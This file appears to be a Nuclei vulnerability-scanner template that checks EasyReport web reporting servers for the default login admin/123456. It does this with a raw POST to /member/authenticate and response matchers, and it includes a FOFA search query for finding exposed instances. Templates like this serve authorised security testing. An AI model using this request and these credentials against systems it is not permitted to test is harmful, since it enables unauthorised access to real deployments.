http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"code":'
    - '"detailMsg":'
    - '"data":true'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - 123456
    username:
    - admin
  raw:
  - 'POST /member/authenticate HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest


    account={{username}}&password={{password}}&rememberMe=false

    '
id: easyreport-default-login
info:
  author: SleepingBag945
  classification:
    cwe-id: CWE-798
  metadata:
    fofa-query: body="EasyReport-A Sample and Easy to Use Web Reporting System"
    max-request: 1
    verified: true
  name: EasyReport - Default Login
  severity: high
  tags: easyreport,default-login,vuln
